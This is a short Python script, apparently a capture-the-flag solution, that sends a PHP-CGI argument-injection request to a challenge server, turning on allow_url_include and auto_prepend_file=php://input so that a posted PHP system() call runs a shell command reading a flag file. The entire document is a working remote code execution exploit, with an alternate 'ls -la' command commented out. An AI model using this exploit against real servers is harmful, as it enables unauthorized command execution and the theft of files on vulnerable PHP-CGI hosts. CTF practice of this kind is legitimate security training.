import requests

# command = 'ls -la'
command = 'cat ./flag_flag_flag.txt'
r = requests.post("https://ctfq.u1tramarine.blue/q12/?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input", data=f"<?php system('{command}'); ?>")
print(r.text)